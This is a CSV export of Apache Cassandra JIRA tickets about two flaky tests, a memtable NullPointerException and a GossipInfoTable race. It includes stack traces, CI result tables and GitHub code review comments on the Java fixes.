|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|4 of 10|CASSANDRA-17461?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie|5 of 10|CASSANDRA-17463?|
|org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.testConditionalDelete[1: clusterMinVersion=3.11]-compression|1 of 10|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky compaction_test.py::TestCompaction:: test_user_defined_compaction,CASSANDRA-17587,13442561,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,blambov,e.dimitrova,e.dimitrova,29/Apr/22 17:54,05/Oct/22 22:22,13/Jul/23 08:40,29/Jun/22 09:18,4.1,4.1-beta1,5.0,,,,CI,,,,0,,"As proved this test is flaky on trunk compaction_test.py::TestCompaction:: test_user_defined_compaction:

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1575/workflows/f9409df6-825f-4996-976a-0182549d87dc/jobs/10405/tests]

I haven't tested other branches, probably good to be tested by whoever assigns this ticket.
{code:java}
test teardown failure Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Native-Transport-Requests-53] 2022-04-29 16:54:33,003 StorageProxy.java:1631 - Failed to apply mutation locally : java.lang.RuntimeException: null for ks: keyspace1, table: standard1 at org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1442) at org.apache.cassandra.db.CassandraTableWriteHandler.write(CassandraTableWriteHandler.java:40) at org.apache.cassandra.db.Keyspace.applyInternal(Keyspace.java:653) at org.apache.cassandra.db.Keyspace.apply(Keyspace.java:506) at org.apache.cassandra.db.Mutation.apply(Mutation.java:228) at org.apache.cassandra.db.Mutation.apply(Mutation.java:248) at org.apache.cassandra.service.StorageProxy$4.runMayThrow(StorageProxy.java:1625) at org.apache.cassandra.service.StorageProxy$LocalMutationRunnable.run(StorageProxy.java:2537) at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124) at org.apache.cassandra.concurrent.SEPExecutor.maybeExecuteImmediately(SEPExecutor.java:214) at org.apache.cassandra.concurrent.Stage.maybeExecuteImmediately(Stage.java:127) at org.apache.cassandra.service.StorageProxy.performLocally(StorageProxy.java:1619) at org.apache.cassandra.service.StorageProxy.sendToHintedReplicas(StorageProxy.java:1526) at org.apache.cassandra.service.StorageProxy.lambda$static$0(StorageProxy.java:212) at org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:1358) at org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:867) at org.apache.cassandra.service.StorageProxy.mutateWithTriggers(StorageProxy.java:1129) at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithoutCondition(ModificationStatement.java:516) at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:491) at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:258) at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:825) at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:803) at org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:167) at org.apache.cassandra.transport.Message$Request.execute(Message.java:254) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:122) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:141) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:168) at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57) at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:834) Caused by: java.lang.NullPointerException: null at org.apache.cassandra.db.memtable.AbstractMemtableWithCommitlog.accepts(AbstractMemtableWithCommitlog.java:101) at org.apache.cassandra.db.lifecycle.Tracker.getMemtableFor(Tracker.java:329) at org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1421) ... 33 common frames omitted, ERROR [Native-Transport-Requests-53] 2022-04-29 16:54:33,003 StorageProxy.java:1631 - Failed to apply mutation locally : java.lang.RuntimeException: null for ks: keyspace1, table: standard1 at org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1442) at org.apache.cassandra.db.CassandraTableWriteHandler.write(CassandraTableWriteHandler.java:40) at org.apache.cassandra.db.Keyspace.applyInternal(Keyspace.java:653) at org.apache.cassandra.db.Keyspace.apply(Keyspace.java:506) at org.apache.cassandra.db.Mutation.apply(Mutation.java:228) at org.apache.cassandra.db.Mutation.apply(Mutation.java:248) at org.apache.cassandra.service.StorageProxy$4.runMayThrow(StorageProxy.java:1625) at org.apache.cassandra.service.StorageProxy$LocalMutationRunnable.run(StorageProxy.java:2537) at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124) at org.apache.cassandra.concurrent.SEPExecutor.maybeExecuteImmediately(SEPExecutor.java:214) at org.apache.cassandra.concurrent.Stage.maybeExecuteImmediately(Stage.java:127) at org.apache.cassandra.service.StorageProxy.performLocally(StorageProxy.java:1619) at org.apache.cassandra.service.StorageProxy.sendToHintedReplicas(StorageProxy.java:1526) at org.apache.cassandra.service.StorageProxy.lambda$static$0(StorageProxy.java:212) at org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:1358) at org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:867) at org.apache.cassandra.service.StorageProxy.mutateWithTriggers(StorageProxy.java:1129) at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithoutCondition(ModificationStatement.java:516) at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:491) at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:258) at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:825) at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:803) at org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:167) at org.apache.cassandra.transport.Message$Request.execute(Message.java:254) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:122) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:141) at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:168) at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57) at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:834) Caused by: java.lang.NullPointerException: null at org.apache.cassandra.db.memtable.AbstractMemtableWithCommitlog.accepts(AbstractMemtableWithCommitlog.java:101) at org.apache.cassandra.db.lifecycle.Tracker.getMemtableFor(Tracker.java:329) at org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1421) ... 33 common frames omitted]{code}",,adelapena,blambov,e.dimitrova,jmckenzie,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17637,CASSANDRA-17714,,,,,,,,,,,CASSANDRA-17637,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,djatnieks,jakubzytka,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 15:59:07 UTC 2022,,,,,,,All,,,,"0|z11yeo:",9223372036854775807,,,,djatnieks,maedhroz,,,Normal,,4.1-alpha,,https://github.com/apache/cassandra/pull/1674,,,,,,,,,"Repeated unit test, no documentation necessary",,,,,"29/Apr/22 17:58;brandon.williams;This appears to be a bug, not a test issue.;;;","29/Apr/22 18:05;e.dimitrova;Yes, but comes from a specific test, if you mean it shouldn't be marked as test failure.

Feel free to edit description, etc if I didn't fill it correctly. I always have hard time putting the right categories :) ;;;","08/Jun/22 07:54;e.dimitrova;I was bisecting this one and it points to CEP-11, the Memtable API - CASSANDRA-17034.

[~barnie], [~maedhroz], [~adelapena], anyone of you having cycles to take a look?

We hit it fairly rarely,  but it seems legit bug.

I ran it in a loop like 500 times with a few older commits to be sure. At least once we hit it when we apply CASSANDRA-17034.

 1000 [successful runs|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1706/workflows/049f7235-337a-4569-ae34-7f26cec46c33] with the last commit before CASSANDRA-17034.

 [Failing already|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1705/workflows/40525702-9518-4e16-a2fd-82537fcf6fa8/jobs/11931] when we apply the patch.

  ;;;","08/Jun/22 13:26;blambov;Fix [passes 1000 runs|https://app.circleci.com/pipelines/github/blambov/cassandra/219/workflows/98378b7f-543d-4021-818c-f71dc148c6a4/jobs/734].;;;","10/Jun/22 17:46;maedhroz;Given this is an actual bug fix, not just a test fix, so we have a full CI run as well?

Otherwise, +1;;;","18/Jun/22 16:26;blambov;The tests are run here: [4.1|https://app.circleci.com/pipelines/github/blambov/cassandra?branch=CASSANDRA-17587] [trunk|https://app.circleci.com/pipelines/github/blambov/cassandra?branch=CASSANDRA-17587-4.1]

[Trunk without the patch for comparison|https://app.circleci.com/pipelines/github/blambov/cassandra?branch=trunk].;;;","24/Jun/22 13:04;blambov;I don't know how to read these test results TBH, but they are very similar.;;;","24/Jun/22 14:00;e.dimitrova;CircleCI gets frozen and doesn't give me the chance to see the exact errors. I only see many python DTests failing. I. suspect it should be something wrong with Circle config maybe. Let me try it myself;;;","24/Jun/22 15:02;e.dimitrova;I think I know what happened, I think you used CircleCI free account and the higher config that you applied for higher resources didn't work. You set large container but if you open the Python DTests run, on top it says it used medium. Expected to see many failures due to lack of resources

I rebased the branches and pushed all tests for you, including the repeated runs jobs and upgrade tests:

[4.1|https://github.com/ekaterinadimitrova2/cassandra/tree/CASSANDRA-17587-4.1] - [CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=CASSANDRA-17587-4.1&filter=all]

[trunk|https://github.com/ekaterinadimitrova2/cassandra/tree/CASSANDRA-17587] - [CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=CASSANDRA-17587&filter=all];;;","24/Jun/22 15:03;e.dimitrova;PS When they complete the easiest way to check them is Butler which we started using recently - https://butler.cassandra.apache.org/#/;;;","27/Jun/22 15:35;blambov;I found the problem, the CI script was not configured correctly. Now the tests look much better: [4.1|https://app.circleci.com/pipelines/github/blambov/cassandra/229/workflows/6c8057ac-8f89-4491-a0de-a33427776a26] [trunk|https://app.circleci.com/pipelines/github/blambov/cassandra/230/workflows/9f481a69-7783-4514-8588-5463c1fe02a6]
;;;","29/Jun/22 09:16;blambov;Committed as [60b54425edc0a328bc1baf00c2e5bf111d4b9da8|https://github.com/apache/cassandra/commit/60b54425edc0a328bc1baf00c2e5bf111d4b9da8] (4.1) and [4e8c83118963c1e142bd29eb997be73308a942c7|https://github.com/apache/cassandra/commit/4e8c83118963c1e142bd29eb997be73308a942c7] (trunk).;;;","06/Jul/22 15:59;jmckenzie;[ASF CI Results]
Branch: 4.1, build number: 82
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/82/]
JIRA: CASSANDRA-17587
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=60b54425edc0a328bc1baf00c2e5bf111d4b9da8]
affected paths:
 * src/java/org/apache/cassandra/db/memtable/Flushing.java
 * src/java/org/apache/cassandra/db/memtable/AbstractMemtable.java
 * src/java/org/apache/cassandra/db/ColumnFamilyStore.java
 * src/java/org/apache/cassandra/db/memtable/AbstractMemtableWithCommitlog.java
 * src/java/org/apache/cassandra/db/memtable/Memtable.java
 * test/unit/org/apache/cassandra/db/commitlog/CommitLogCQLTest.java
 * CHANGES.txt

Build Result: UNSTABLE
Passing Tests: 47199
Failing Tests: 19
||Test|Failures|JIRA|
|org.apache.cassandra.cql3.validation.operations.SelectTest.filteringWithOrderClause|6 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.SchemaTest.readRepair|19 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.bootstrap_test.TestBootstrap.test_simultaneous_bootstrap|2 of 79|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestBootstrap*%22]|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|12 of 79|CASSANDRA-17461?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_parallel_upgrade_with_internode_ssl|2 of 79|CASSANDRA-17610?|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|20 of 79|CASSANDRA-17461?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|5 of 79|CASSANDRA-17610?|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|7 of 79|CASSANDRA-16677?|
|org.apache.cassandra.distributed.upgrade.CompactStorageImplicitNullInClusteringTest.testImplicitNullInClusteringWithCompactStorage|7 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect|7 of 79|CASSANDRA-16677?|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|9 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_EndsAt_Trunk_HEAD.test_parallel_upgrade_with_internode_ssl|5 of 79|CASSANDRA-17296?|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testReversedTypeTuple|6 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.utils.memory.LongBufferPoolTest.testPoolAllocateWithRecyclePartially|7 of 79|CASSANDRA-16681?|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|17 of 79|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|junit.framework.TestSuite.org.apache.cassandra.metrics.ClientRequestMetricsTest|1 of 79|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*metrics*%22]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - org.apache.cassandra.db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions,CASSANDRA-17584,13442103,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,brandon.williams,brandon.williams,27/Apr/22 14:48,05/Oct/22 22:22,13/Jul/23 08:40,07/Jun/22 21:17,4.1-beta1,5.0,,,,,Feature/Virtual Tables,,,,0,,"h3. Error Message

['LOAD' is expected to be null] expected:<null> but was:<Value(122848.0,28)>
h3. Stacktrace

junit.framework.AssertionFailedError: ['LOAD' is expected to be null] expected:<null> but was:<Value(122848.0,28)> at org.apache.cassandra.db.virtual.GossipInfoTableTest.assertValue(GossipInfoTableTest.java:174) at org.apache.cassandra.db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions(GossipInfoTableTest.java:96)",,adelapena,e.dimitrova,smiklosovic,,,,,,,,,,,,"adelapena commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891077216


##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +89,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   I think we don't need to create a new `EndpointState` here, the `EndpointState` is already copied by the `testSelectAllWithStateTransitions` test.



##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -19,8 +19,12 @@
 package org.apache.cassandra.db.virtual;
 
 import java.util.EnumSet;
+import java.util.HashMap;
+import java.util.HashSet;

Review Comment:
   Nit: unused imports



##########
test/unit/org/apache/cassandra/db/virtual/GossipInfoTableTest.java:
##########
@@ -33,64 +36,68 @@
 import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.locator.InetAddressAndPort;
 
+import static com.google.common.collect.ImmutableList.of;
 import static org.assertj.core.api.Assertions.assertThat;
 
 public class GossipInfoTableTest extends CQLTester
 {
-    private static final String KS_NAME = ""vts"";
-
-    @SuppressWarnings(""FieldCanBeLocal"")
-    private GossipInfoTable table;
-
     @BeforeClass
     public static void setUpClass()
     {
         CQLTester.setUpClass();
     }
 
-    @Before
-    public void config()
-    {
-        table = new GossipInfoTable(KS_NAME);
-        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(KS_NAME, ImmutableList.of(table)));
-    }
-
     @Test
     public void testSelectAllWhenGossipInfoIsEmpty() throws Throwable
     {
-        assertEmpty(execute(""SELECT * FROM vts.gossip_info""));
+        // we have not triggered gossiper yet
+        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(""vts_1"",
+                                                                      of(new GossipInfoTable(""vts_1"", HashMap::new))));
+        assertEmpty(execute(""SELECT * FROM vts_1.gossip_info""));
     }
 
-    @SuppressWarnings(""deprecation"")
     @Test
     public void testSelectAllWithStateTransitions() throws Throwable
     {
         try
         {
             requireNetwork(); // triggers gossiper
 
-            UntypedResultSet resultSet = execute(""SELECT * FROM vts.gossip_info"");
+            final AtomicReference<Map<InetAddressAndPort, EndpointState>> stateRef = new AtomicReference<>(null);
+
+            Awaitility.await().until(() -> {
+                ConcurrentMap<InetAddressAndPort, EndpointState> endpointStateMap = Gossiper.instance.endpointStateMap;
+                stateRef.set(endpointStateMap);
+                return endpointStateMap.size() == 1;
+            });
+
+            Optional<Map.Entry<InetAddressAndPort, EndpointState>> entry = stateRef.get().entrySet().stream().findFirst();
+            assertThat(entry).isNotEmpty();
+
+            InetAddressAndPort endpoint = entry.get().getKey();
+            EndpointState localState = new EndpointState(entry.get().getValue());

Review Comment:
   This might be simplified to:
   ```java
   ConcurrentMap<InetAddressAndPort, EndpointState> states = Gossiper.instance.endpointStateMap;
   Awaitility.await().until(() -> !states.isEmpty());
   Map.Entry<InetAddressAndPort, EndpointState> entry = states.entrySet().stream().findFirst()
                                                              .orElseThrow(AssertionError::new);
   InetAddressAndPort endpoint = entry.getKey();
   EndpointState localState = new EndpointState(entry.getValue());
   ```



##########
test/unit/org/apache/cassandra/db/virtual/GossipInfoTableTest.java:
##########
@@ -33,64 +36,68 @@
 import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.locator.InetAddressAndPort;
 
+import static com.google.common.collect.ImmutableList.of;
 import static org.assertj.core.api.Assertions.assertThat;
 
 public class GossipInfoTableTest extends CQLTester
 {
-    private static final String KS_NAME = ""vts"";
-
-    @SuppressWarnings(""FieldCanBeLocal"")
-    private GossipInfoTable table;
-
     @BeforeClass
     public static void setUpClass()
     {
         CQLTester.setUpClass();
     }
 
-    @Before
-    public void config()
-    {
-        table = new GossipInfoTable(KS_NAME);
-        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(KS_NAME, ImmutableList.of(table)));
-    }
-
     @Test
     public void testSelectAllWhenGossipInfoIsEmpty() throws Throwable
     {
-        assertEmpty(execute(""SELECT * FROM vts.gossip_info""));
+        // we have not triggered gossiper yet
+        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(""vts_1"",
+                                                                      of(new GossipInfoTable(""vts_1"", HashMap::new))));
+        assertEmpty(execute(""SELECT * FROM vts_1.gossip_info""));
     }
 
-    @SuppressWarnings(""deprecation"")
     @Test
     public void testSelectAllWithStateTransitions() throws Throwable
     {
         try
         {
             requireNetwork(); // triggers gossiper
 
-            UntypedResultSet resultSet = execute(""SELECT * FROM vts.gossip_info"");
+            final AtomicReference<Map<InetAddressAndPort, EndpointState>> stateRef = new AtomicReference<>(null);
+
+            Awaitility.await().until(() -> {
+                ConcurrentMap<InetAddressAndPort, EndpointState> endpointStateMap = Gossiper.instance.endpointStateMap;
+                stateRef.set(endpointStateMap);
+                return endpointStateMap.size() == 1;
+            });
+
+            Optional<Map.Entry<InetAddressAndPort, EndpointState>> entry = stateRef.get().entrySet().stream().findFirst();
+            assertThat(entry).isNotEmpty();

Review Comment:
   This check is duplicated a few lines below.



;07/Jun/22 11:07;githubbot;600","smiklosovic commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891085898


##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +89,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   @adelapena well, but imagine that this is used in production, then we get that map from the gossip. However, is not it true that by time I am populating the table, that value would change? This basically ensures that whatever happes in Gossiper, the table I am going to return basically captures one particular point in time.



;07/Jun/22 11:12;githubbot;600","smiklosovic commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891085898


##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +89,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   @adelapena well, but imagine that this is used in production, then we get that map from the gossip. However, is not it true that by time I am populating the table, that value might change or it might change in the middle of me processing it? This basically ensures that whatever happes in Gossiper, the table I am going to return basically captures one particular point in time.



##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +89,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   @adelapena well, but imagine that this is used in production, then we get that map from the gossip. However, is not it true that by time I am populating the table, that value might change or it might change in the middle of me processing it? This basically ensures that whatever happens in Gossiper, the table I am going to return basically captures one particular point in time.



;07/Jun/22 11:13;githubbot;600","adelapena commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891358081


##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +89,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   Ah, that makes sense. I thought this was related with the test fix, but it seems like a separate fix/improvement. I'm ok with it.



;07/Jun/22 15:09;githubbot;600","adelapena commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891509197


##########
test/unit/org/apache/cassandra/db/virtual/GossipInfoTableTest.java:
##########
@@ -33,64 +36,58 @@
 import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.locator.InetAddressAndPort;
 
+import static com.google.common.collect.ImmutableList.of;
 import static org.assertj.core.api.Assertions.assertThat;
 
 public class GossipInfoTableTest extends CQLTester
 {
-    private static final String KS_NAME = ""vts"";
-
-    @SuppressWarnings(""FieldCanBeLocal"")
-    private GossipInfoTable table;
-
     @BeforeClass
     public static void setUpClass()
     {
         CQLTester.setUpClass();
     }
 
-    @Before
-    public void config()
-    {
-        table = new GossipInfoTable(KS_NAME);
-        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(KS_NAME, ImmutableList.of(table)));
-    }
-
     @Test
     public void testSelectAllWhenGossipInfoIsEmpty() throws Throwable
     {
-        assertEmpty(execute(""SELECT * FROM vts.gossip_info""));
+        // we have not triggered gossiper yet
+        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(""vts_1"",
+                                                                      of(new GossipInfoTable(""vts_1"", HashMap::new))));
+        assertEmpty(execute(""SELECT * FROM vts_1.gossip_info""));
     }
 
-    @SuppressWarnings(""deprecation"")
     @Test
     public void testSelectAllWithStateTransitions() throws Throwable
     {
         try
         {
             requireNetwork(); // triggers gossiper
 
-            UntypedResultSet resultSet = execute(""SELECT * FROM vts.gossip_info"");
+            ConcurrentMap<InetAddressAndPort, EndpointState> states = Gossiper.instance.endpointStateMap;
+            Awaitility.await().until(() -> !states.isEmpty());
+            Map.Entry<InetAddressAndPort, EndpointState> entry = states.entrySet().stream().findFirst()
+                    .orElseThrow(AssertionError::new);
+            InetAddressAndPort endpoint = entry.getKey();
+            EndpointState localState = new EndpointState(entry.getValue());
 
-            assertThat(resultSet.size()).isEqualTo(1);
-            assertThat(Gossiper.instance.endpointStateMap.size()).isEqualTo(1);
+            Supplier<Map<InetAddressAndPort, EndpointState>> endpointStateMapSupplier = () -> new HashMap<InetAddressAndPort, EndpointState>() {{put(endpoint, localState);}};
 
-            Optional<Map.Entry<InetAddressAndPort, EndpointState>> entry = Gossiper.instance.endpointStateMap.entrySet()

Review Comment:
   Nit: Now the import of `Optional` is not used anymore.



##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +87,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   Maybe we can add a brief comment here saying that we are snapshotting the `EndpointState`s obtained from Gossiper because they can be concurrently modified by `LoadBroadcaster`.



##########
test/unit/org/apache/cassandra/db/virtual/GossipInfoTableTest.java:
##########
@@ -18,11 +18,14 @@
 
 package org.apache.cassandra.db.virtual;
 
+import java.util.HashMap;
 import java.util.Map;
 import java.util.Optional;
+import java.util.concurrent.ConcurrentMap;
+import java.util.concurrent.atomic.AtomicReference;

Review Comment:
   Nit: unused import after the last changes.



